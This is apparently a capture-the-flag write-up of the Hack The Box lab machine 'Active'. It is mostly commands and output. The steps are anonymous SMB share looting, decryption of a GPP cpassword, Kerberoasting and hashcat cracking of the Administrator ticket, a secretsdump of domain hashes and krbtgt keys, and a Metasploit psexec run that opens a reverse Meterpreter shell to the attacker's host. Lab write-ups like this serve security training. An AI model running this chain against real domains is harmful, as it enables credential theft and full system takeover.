# Active
https://app.hackthebox.com/machines/Active?tab=play_machine

![](./screenshots/active.png)

## Enumeration

Firstly the attacker will enumerate the box with rustscan
```bash
✘ rustscan -a 10.129.3.50

<SNIP>

Open 10.129.3.50:53
Open 10.129.3.50:88
Open 10.129.3.50:135
Open 10.129.3.50:139
Open 10.129.3.50:389
Open 10.129.3.50:445
Open 10.129.3.50:464
Open 10.129.3.50:593
Open 10.129.3.50:636
Open 10.129.3.50:3269
Open 10.129.3.50:3268
Open 10.129.3.50:5722
Open 10.129.3.50:9389
```

The attacker cannot perform [anonymous authentication on users](https://calcomsoftware.com/network-access-do-not-allow-anonymous-enumeration-of-sam-accounts/), interestingly however, anonymous enumeration of shares is enabled.
```bash
👤 rosskeddy 🏠  took 2s 
➜ nxc smb active.htb -u '' -p '' --users
SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.50     445    DC               [+] active.htb\:                      
👤 rosskeddy 🏠  took 2s 
➜ nxc smb active.htb -u '' -p '' --shares
SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.50     445    DC               [+] active.htb\: 
SMB         10.129.3.50     445    DC               [*] Enumerated shares
SMB         10.129.3.50     445    DC               Share           Permissions     Remark
SMB         10.129.3.50     445    DC               -----           -----------     ------
SMB         10.129.3.50     445    DC               ADMIN$                          Remote Admin
SMB         10.129.3.50     445    DC               C$                              Default share
SMB         10.129.3.50     445    DC               IPC$                            Remote IPC
SMB         10.129.3.50     445    DC               NETLOGON                        Logon server share 
SMB         10.129.3.50     445    DC               Replication     READ            
SMB         10.129.3.50     445    DC               SYSVOL                          Logon server share 
SMB         10.129.3.50     445    DC               Users                         
```

The attacker will anonymously connect and grab all the files out of that share.
```zsh
➜ smbclient \\\\active.htb\\Replication -N -c 'recurse; mget *'
Anonymous login successful
Get directory active.htb? y
Get directory DfsrPrivate? y
Get directory Policies? y
Get directory scripts? y
Get directory ConflictAndDeleted? y
Get directory Deleted? y
Get directory Installing? y
Get directory {31B2F340-016D-11D2-945F-00C04FB984F9}? y
Get directory {6AC1786C-016F-11D2-945F-00C04fB984F9}? y
Get file GPT.INI? y
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
Get directory Group Policy? y
Get directory MACHINE? y
Get directory USER? y
Get file GPT.INI? y
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
Get directory MACHINE? y
Get directory USER? y
Get file GPE.INI? y
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.7 KiloBytes/sec) (average 0.3 KiloBytes/sec)
Get directory Microsoft? y
Get directory Preferences? y
Get file Registry.pol? y
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (11.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
Get directory Microsoft? y
Get directory Windows NT? y
Get directory Groups? y
Get directory Windows NT? y
Get directory SecEdit? y
Get file Groups.xml? y
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (3.1 KiloBytes/sec) (average 3.5 KiloBytes/sec)
Get directory SecEdit? y
Get file GptTmpl.inf? y
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.0 KiloBytes/sec) (average 3.9 KiloBytes/sec)
Get file GptTmpl.inf? y
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (15.3 KiloBytes/sec) (average 5.8 KiloBytes/sec)
```

## Privilege Escalation

Within this share it appears to be containing a backup of some SYSVOL data. Within it the attacker discovers a cpassword. This can easily be decrypted with a built-in Kali Linux tool 'gpp-decrypt'
```zsh
👤 rosskeddy /active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
➜ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

👤 rosskeddy MACHINE/Preferences/Groups 
➜ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

With that credential secured, the attacker will continue their enumeration of the target system.
```zsh
👤 rosskeddy 🏠 /work/active.htb 
➜ nxc smb active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'
SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.50     445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18                            
```

## Credentialed Enumeration
```zsh
👤 rosskeddy 🏠 /work/active.htb took 2s 
➜ nxc smb active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --users
SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.50     445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.129.3.50     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-  
SMB         10.129.3.50     445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain                                                                                      
SMB         10.129.3.50     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                    
SMB         10.129.3.50     445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account                                                                                                     
SMB         10.129.3.50     445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
SMB         10.129.3.50     445    DC               [*] Enumerated 4 local users: ACTIVE

👤 rosskeddy 🏠 /work/active.htb took 4s 
➜ nxc smb active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.50     445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.129.3.50     445    DC               [*] Enumerated shares
SMB         10.129.3.50     445    DC               Share           Permissions     Remark
SMB         10.129.3.50     445    DC               -----           -----------     ------
SMB         10.129.3.50     445    DC               ADMIN$                          Remote Admin
SMB         10.129.3.50     445    DC               C$                              Default share
SMB         10.129.3.50     445    DC               IPC$                            Remote IPC
SMB         10.129.3.50     445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.3.50     445    DC               Replication     READ            
SMB         10.129.3.50     445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.3.50     445    DC               Users           READ           
```

```zsh
👤 rosskeddy 🏠 /work took 1m21s 
➜ nxc ldap active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --kerberoasting kerberoastable.txt  
LDAP        10.129.3.50     389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert)                                                                                  
LDAP        10.129.3.50     389    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
LDAP        10.129.3.50     389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.3.50     389    DC               [*] Total of records returned 1
LDAP        10.129.3.50     389    DC               [*] sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon: 2026-01-28 09:25:59.414979
LDAP        10.129.3.50     389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$b9a30aeaa330d3b256d12e5e399a5749$e4013a4905175eb25ac06623df425fd4f1093053b8e3dbcf6fc556579b76894d30beaa69c8aab4b3b1955bf54e455a7ba67f511196e0ece6447425d4787606f49bb9e9210e3c8f4502d104561817ab838e16cba1565ea7e32e8e82f6e4df814a50839c1c69ba4d9f8b53ce0f174541dde0e530e6faf46a32286b28c711a11354e119115954a731a99aeee209993110b984e9afff8e52930c5af5d134b2d6fb6a1eae8836e58249ad80da2d8beab665980413851042bc6a3dc11de87a7be19d887307a58ad6e60ee5f80354e05dee53be49e30b521993c9d9e3a5c7973c790dca233f8173c7ebeea6ba7c7f946908ff570c7d97eb606f494212284144f606a37f897ba77fd3783b912fd0da0ec1fd04ac4565a34682c3894d96c8209a09cb3430d821ecb8c5c9da928aefc268147cc273298e6929fa64e3c98cb5a97bc491bd62289ceb598b8bf25cd58d25aa51ceac8f3ebff16ecc1c0f015fc34591789ff00a61593f2a0d260777252e899273be45420dd2a82d21b9c69d5fff79e466eae8e59602afe0fbb5e1b90e607e1d1c91d5253652089585421ceb4440742df6342293d3d7177300a94806b495fa1441f11a4af3becb84ba3f82785e5bf46f104f22d94e7f7b1ec662f36101f62d57029bac1dc7033bca8d4527d691c4b04205d0817620b6bcfbdc64e10b7a6ca2389d52c00b359250faabf9428abc84e01a32610ae978ffd8ea93362f136c04235116cb89e85e4a9be1d42fe207ad7c6412be2cbac3866ec86fb1f985b04004f238e56c83ffcae5b2a4c23e0b44842a7e899bc24bb7b69019d3dac1f95cd9260089ff9c580fb7c806a33616dffd96dc5f72e8f706574fe9625c61c2ef6412b83192738413a5c53d65a30b0ab1c246278000bc10c5b634c842bfa6a7b43ee3f40e73e3ec2ba51dabfb9a890cc88e099ccb411cc3c8e656cfc44c95ad725f87c2e8d1ee7775cba487c4af2913bf3fd87f44537ea20d51b8c85c02937eb73fdc7531ac2f2eaa5b0d3715e937c8561a3cb190d3c6dcc76a5ec63c846a4c265a96c6385998cc2b40a199866e150e6a83dcf298c7db53c71ed6e0af95cf2222bb57870fe84d0bc39d7e548ba7f2f1a6bd6749645460caa8e747d26e68312e773f27c95acc261a03914fe8f51be8ed59293633ef78e814f5879efb33a3859a0f42ac2db551143ad712c368cca6355c4e3afdb0494a5a3b5931313a4378b6fd8e29a0f63549b3d77b4d762ef1a4de3199561290
```

```zsh
➜ hashcat -m 13100 kerberoastable.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$b9a30aeaa330d3b256d12e5e399a5749$e4013a4905175eb25ac06623df425fd4f1093053b8e3dbcf6fc556579b76894d30beaa69c8aab4b3b1955bf54e455a7ba67f511196e0ece6447425d4787606f49bb9e9210e3c8f4502d104561817ab838e16cba1565ea7e32e8e82f6e4df814a50839c1c69ba4d9f8b53ce0f174541dde0e530e6faf46a32286b28c711a11354e119115954a731a99aeee209993110b984e9afff8e52930c5af5d134b2d6fb6a1eae8836e58249ad80da2d8beab665980413851042bc6a3dc11de87a7be19d887307a58ad6e60ee5f80354e05dee53be49e30b521993c9d9e3a5c7973c790dca233f8173c7ebeea6ba7c7f946908ff570c7d97eb606f494212284144f606a37f897ba77fd3783b912fd0da0ec1fd04ac4565a34682c3894d96c8209a09cb3430d821ecb8c5c9da928aefc268147cc273298e6929fa64e3c98cb5a97bc491bd62289ceb598b8bf25cd58d25aa51ceac8f3ebff16ecc1c0f015fc34591789ff00a61593f2a0d260777252e899273be45420dd2a82d21b9c69d5fff79e466eae8e59602afe0fbb5e1b90e607e1d1c91d5253652089585421ceb4440742df6342293d3d7177300a94806b495fa1441f11a4af3becb84ba3f82785e5bf46f104f22d94e7f7b1ec662f36101f62d57029bac1dc7033bca8d4527d691c4b04205d0817620b6bcfbdc64e10b7a6ca2389d52c00b359250faabf9428abc84e01a32610ae978ffd8ea93362f136c04235116cb89e85e4a9be1d42fe207ad7c6412be2cbac3866ec86fb1f985b04004f238e56c83ffcae5b2a4c23e0b44842a7e899bc24bb7b69019d3dac1f95cd9260089ff9c580fb7c806a33616dffd96dc5f72e8f706574fe9625c61c2ef6412b83192738413a5c53d65a30b0ab1c246278000bc10c5b634c842bfa6a7b43ee3f40e73e3ec2ba51dabfb9a890cc88e099ccb411cc3c8e656cfc44c95ad725f87c2e8d1ee7775cba487c4af2913bf3fd87f44537ea20d51b8c85c02937eb73fdc7531ac2f2eaa5b0d3715e937c8561a3cb190d3c6dcc76a5ec63c846a4c265a96c6385998cc2b40a199866e150e6a83dcf298c7db53c71ed6e0af95cf2222bb57870fe84d0bc39d7e548ba7f2f1a6bd6749645460caa8e747d26e68312e773f27c95acc261a03914fe8f51be8ed59293633ef78e814f5879efb33a3859a0f42ac2db551143ad712c368cca6355c4e3afdb0494a5a3b5931313a4378b6fd8e29a0f63549b3d77b4d762ef1a4de3199561290:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

## Privilege Escalation
```zsh
👤 rosskeddy 🏠 /work took 7s 
➜ nxc smb active.htb -u 'Administrator' -p 'Ticketmaster1968'                                  
SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.50     445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
                    
👤 rosskeddy 🏠 /work took 3s 
➜ secretsdump.py active.htb/Administrator:Ticketmaster1968@10.129.3.50
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xff954ee81ffb63937b563f523caf1d59
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ACTIVE\DC$:aes256-cts-hmac-sha1-96:e315ac07b4bee0d5ff24e2e552ef4fc1ae3655cef32e74e5caea949e05fb7f4b
ACTIVE\DC$:aes128-cts-hmac-sha1-96:d004b2a3946df7f0be8d3fdd911bbacf
ACTIVE\DC$:des-cbc-md5:ec43f1d5750ead26
ACTIVE\DC$:plain_password_hex:2634b8bb4c8841d50c52d7bb3ade432bdb5c0343646e9e4dbc65ca543915024fe9dc14b03d1757a39e2e2476bff88cc3f99aaff0cb5b0fc90a3b233587fc148fb667bbabf1cd4266775746e33243318de556053c160e62e4a1bb1dc26153b3f3aee59455e2f14a9018c58553df83364c7d6237f96e70680ce606cb815d40400668ac3505c87936287b4e2ad7a9665b7b56843f300cdf07dbcdded25726c8a9b187792b0324e993ba6a59b0c7c70a1f030cc701ae143974116c50ce836810666de8fb59ed2380aadd0d7685a7274efc00bd4129b1ce95f2628a406e0050d88750e0afd6fab413b0a676ce498659821420
ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:52ebcff24a861a42624df3b67140f07a:::
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x377bd35be67705f345dabf00d3181e269e0fb1e6
dpapi_userkey:0x7586c391e559565c85cb342d1d24546381f0d5cb
[*] NL$KM 
 0000   CC 6F B8 46 C3 0C 58 05  2F F2 07 2E DA E6 BF 7D   .o.F..X./......}
 0010   60 63 F6 89 E7 0E D5 D5  22 EE 54 DA 63 12 5B B5   `c......".T.c.[.
 0020   D8 DA 0B B7 82 0E 3D E1  9D 7A 03 15 08 5C B0 AE   ......=..z...\..
 0030   EF 63 91 B9 6C 87 65 A8  14 62 95 BC 77 69 77 08   .c..l.e..b..wiw.
NL$KM:cc6fb846c30c58052ff2072edae6bf7d6063f689e70ed5d522ee54da63125bb5d8da0bb7820e3de19d7a0315085cb0aeef6391b96c8765a8146295bc77697708
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:52ebcff24a861a42624df3b67140f07a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
Administrator:des-cbc-md5:5891549b31f2c294
krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
krbtgt:des-cbc-md5:9d044f891adf7629
active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
DC$:aes256-cts-hmac-sha1-96:e315ac07b4bee0d5ff24e2e552ef4fc1ae3655cef32e74e5caea949e05fb7f4b
DC$:aes128-cts-hmac-sha1-96:d004b2a3946df7f0be8d3fdd911bbacf
DC$:des-cbc-md5:97add98cc10831a7
[*] Cleaning up... 
```

```zsh
msf exploit(windows/smb/psexec) > set RHOSTS active.htb
RHOSTS => active.htb
msf exploit(windows/smb/psexec) > set SMBDomain active.htb
SMBDomain => active.htb
msf exploit(windows/smb/psexec) > set SMBPass Ticketmaster1968
SMBPass => Ticketmaster1968
msf exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(windows/smb/psexec) > set SMBSHARE C$
SMBSHARE => C$
msf exploit(windows/smb/psexec) > set LHOST tun0
LHOST => 10.10.16.84
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.10.16.84:4444 
[*] 10.129.3.50:445 - Connecting to the server...
[*] 10.129.3.50:445 - Authenticating to 10.129.3.50:445|active.htb as user 'Administrator'...
[*] 10.129.3.50:445 - Executing the payload...
[+] 10.129.3.50:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (190534 bytes) to 10.129.3.50
[*] Meterpreter session 1 opened (10.10.16.84:4444 -> 10.129.3.50:49369) at 2026-01-28 10:17:37 -0500

meterpreter > shell
Process 2712 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system
```